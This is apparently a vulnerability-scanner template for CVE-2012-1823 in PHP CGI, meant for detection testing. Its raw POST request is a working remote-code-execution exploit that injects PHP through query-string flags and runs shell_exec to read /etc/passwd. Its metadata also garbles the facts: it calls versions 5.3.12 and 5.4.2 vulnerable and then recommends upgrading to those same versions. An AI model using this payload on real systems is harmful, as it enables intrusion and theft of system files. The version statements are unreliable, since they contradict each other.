id: CVE-2012-1823
info:
  name: PHP CGI v5.3.12/5.4.2 Remote Code Execution
  author: pikpikcu
  severity: critical
  description: A vulnerability in PHP CGI versions 5.3.12 and 5.4.2 allows remote
    attackers to execute arbitrary code by exploiting weaknesses in handling query
    strings without an equals sign character.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823
  - https://nvd.nist.gov/vuln/detail/CVE-2012-1823
  - https://bugs.php.net/bug.php?id=61910
  - http://www.php.net/ChangeLog-5.php#5.4.2
  classification:
    cve-id: CVE-2012-1823
  tags: cve2012,kev,vulhub,rce,php,cve
  metadata:
    impact: The CVE-2012-1823 vulnerability in PHP CGI allowed remote attackers to
      execute arbitrary code by manipulating query strings, posing a significant security
      threat to systems using affected versions of PHP.
    recommendation: Upgrade to PHP version 5.3.12 or 5.4.2 immediately to mitigate
      the risk of remote code execution due to query strings lacking an equals sign
      character.
requests:
- raw:
  - 'POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    <?php echo shell_exec("cat /etc/passwd"); ?>

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
    condition: and
  - type: status
    status:
    - 200
